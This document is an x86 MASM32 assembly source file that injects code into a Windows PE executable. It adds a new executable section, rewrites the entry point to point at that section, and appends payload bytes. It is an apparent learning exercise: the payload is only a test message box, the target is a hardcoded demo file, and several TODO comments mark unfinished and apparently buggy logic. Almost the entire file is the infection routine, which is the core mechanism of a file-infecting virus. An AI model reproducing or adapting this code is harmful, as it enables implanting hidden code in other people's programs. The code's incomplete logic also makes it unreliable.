; inject.asm
	
.386
.model flat, stdcall

option casemap:none

		include		\masm32\include\windows.inc
		include		\masm32\include\user32.inc
		include		\masm32\include\kernel32.inc

		includelib	\masm32\lib\user32.lib
		includelib	\masm32\lib\kernel32.lib

		include		\masm32\include\msvcrt.inc
		includelib	\masm32\lib\msvcrt.lib


.data
	PeFile			dd	?
	PeMapObject		dd	?
	PeFileMap		dd	?
	PeSectionNb		dd	?
	PeNtHeader		dd	?
	LastSecHeader		dd	?
	LastSec			dd	?
	PeStartHeader		dd	?
	SectionAlignment	dd	?
	FileAlignment		dd	?
	NewSectionCodeSize	dd	?

	ErrorMessage	db	"Error",0
	FileName	db	"donothing.exe",0
	String_string	db	"%s ",0
	String_number	db	"%d ",0
	NewSectionName	db	"ImIn",0

.code

start:

	; OPEN FILE
	push	0
	push	0
	push	OPEN_EXISTING
	push	0
	push	0
	mov	eax,	GENERIC_READ
	or	eax,	GENERIC_WRITE
	push	eax
	push	offset FileName
	call	CreateFile
	call	CheckError
	mov		PeFile,	eax

	; CREATE_FILE_MAPPING
	push	NULL
	push	0
	push	0
	push	PAGE_READWRITE
	push	NULL
	push	PeFile
	call	CreateFileMapping
	call	CheckError
	mov	PeMapObject, eax

	; MAP_VIEW_OF_FILE
	push	0
	push	0
	push	0
	mov	eax,	FILE_MAP_READ
	or	eax,	FILE_MAP_WRITE
	push	eax
	push	PeMapObject
	call	MapViewOfFile
	call	CheckError
	mov	PeFileMap, eax
	mov	ebx, eax

	; CHECK MAGIC
	cmp	word ptr [ebx], IMAGE_DOS_SIGNATURE
	jne	JumpCheckError


	; CHECK IMAGE_NET_SIGNATURE
	mov	ecx, ebx
	add	ecx, 03Ch
	mov	edx, ebx
	add	edx, dword ptr [ecx]
	mov	PeNtHeader, edx
	cmp	dword ptr [edx], IMAGE_NT_SIGNATURE
	jne	JumpCheckError


	; GET NUMBER SECTIONS
	mov	eax, edx
	add	eax, 6
	mov	PeSectionNb, eax
	xor	ecx, ecx
	mov	cx, word ptr[eax]

	; GET ALIGNMENT
	add	eax, 032h
	mov	esi, [eax]
	mov	SectionAlignment, esi
	add	eax, 04h
	mov	esi, [eax]
	mov	FileAlignment, esi


	; LOOP SECTIONS HEADER
	mov	esi, edx
	add	esi, 0F8h
	mov	PeStartHeader, esi
	mov	ebx, esi ; Keep start of Headers
	mov	LastSec, 0
	Loop_SectionHeader:
	; GET LAST SECTION
	mov	eax, esi
	add	eax, 0Ch
	cmp	LastSec, eax
	jg	keepLastSec
	mov	LastSecHeader, esi
	mov	LastSec, eax
	keepLastSec:
	; SHOW NAME
	mov	eax, esi
	call	DebugMessageBox
	add	esi, 028h
	loop	Loop_SectionHeader


	; CREATE NEW SECTION HEADER
	; COPY FIRST ONE INTO NEW ONE
	mov	ecx, 020h
	mov	edi, esi ; Destination bytes
	mov	esi, PeStartHeader ; Source bytes
	mov	ebx, edi ; Keep start of new header
	CreateNewHeader:
	lodsb
	stosb
	loop	CreateNewHeader

	; INCREMENT NUMBER OF SECTION
	xor	eax, eax
	mov	edi, PeSectionNb
	mov	ax, word ptr [edi]
	inc	eax
	mov	ecx, PeSectionNb
	mov	word ptr [ecx], ax

	; SET PROPERTIES
	; COPY THE NAME
	mov	ecx, 08h ; Length of Name
	mov	esi, offset NewSectionName ; Source bytes
	mov	edi, ebx ; Destination bytes
	pusha ; Keep registers
	CopySectionName:
	lodsb
	stosb
	loop CopySectionName

	; Virtual Size
	popa	; Retrieve registers
	add	edi, 08h
	mov	NewSectionCodeSize, endToInject - toInject ; Size of actual code in new section
	mov	ecx, NewSectionCodeSize
	mov	[edi], ecx

	; Virtual Address (Last section VA + Alignment TODO Check if our code not superior ?)
	add	edi, 04h
	mov	ecx, LastSecHeader
	add	ecx, 0Ch
	mov	ebx, ecx ; Keep VAddress for Raw data
	mov	eax, [ecx]
	add	eax, SectionAlignment
	mov	[edi], eax
	mov	esi, eax ; Keep New VA for EntryPoint

	; Size of raw data (FileAlignment TODO Check if our code not superior?)
	add	edi, 04h
	mov	eax, FileAlignment
	mov	[edi], eax

	; Pointer to raw data (Get last section pointer to raw data + size of raw data)
	add	edi, 04h
	mov	ecx, ebx
	add	ecx, 04h
	mov	eax, [ecx]
	add	ecx, 04h
	add	eax, [ecx]
	mov	[edi], eax

	; Characteristics
	add	edi, 010h
	mov	ecx, IMAGE_SCN_MEM_READ
	or	ecx, IMAGE_SCN_MEM_EXECUTE
	or	ecx, IMAGE_SCN_CNT_CODE
	mov	[edi], ecx


	; CHANGE PE PROPERTIES
	; TODO CHANGE SIZE OF CODE
	mov	eax, PeNtHeader
	add	eax, 01Ch
	; CHANGE ENTRY POINT TODO Need to size every section ?
	add	eax, 0Ch
	mov	[eax], esi
	; CHANGE SIZE OF IMAGE TODO Size every function ?
	add	eax, 028h
	add	ebx, 08h
	add	esi, 01h ; TODO - WTF IS THIS SHIT ? (Size of all virtual size + 1?)
	mov	[eax], esi
	; CLOSE
	push	PeFileMap
	call	UnmapViewOfFile
	push	PeMapObject
	call	CloseHandle
	push	PeFile
	call	CloseHandle


	; CREATE NEW SECTION 
	; OPEN FILE
	push	0
	push	FILE_ATTRIBUTE_NORMAL	
	push	OPEN_ALWAYS
	push	0
	push	FILE_SHARE_READ
	push	FILE_APPEND_DATA
	push	offset FileName
	call	CreateFile
	mov	eax, PeFile

	; INSERT OPCODE
	mov	ecx, 512 ; endToInject - toInject ; Number of bytes
	mov	esi, toInject ; Source bytes
	push	0
	push	0
	push	ecx
	push	esi
	push	PeFile
	call	WriteFile

	; CLOSE
	push	PeFile
	call	CloseHandle


	; EXIT
	push	0
	call 	ExitProcess


; TEST LABEL INJECTION
toInject:
	push	MB_OK
	push	0
	push	0
	push	0
	call	MessageBoxA
	push	0
	call	ExitProcess
endToInject:


print_str	proc
	pusha
	push	eax
	;push	offset String_string
	;call	crt_printf
	popa
	ret
print_str	endp

print_int	proc
	pusha
	push	eax
	push	offset String_number
	call	crt_printf
	popa
	ret
print_int	endp

CheckError:
	cmp		eax, INVALID_HANDLE_VALUE
	jne		EndErrorDebug
JumpCheckError:
	mov		eax, offset FileName
	call	DebugMessageBox
	push	eax
	push	0
	call	ExitProcess
EndErrorDebug:
	ret

DebugMessageBox	proc
	pusha
	push	MB_OK
	push	offset ErrorMessage
	push	eax
	push	0
	call	MessageBoxA
	popa
	ret
DebugMessageBox	endp

end		start
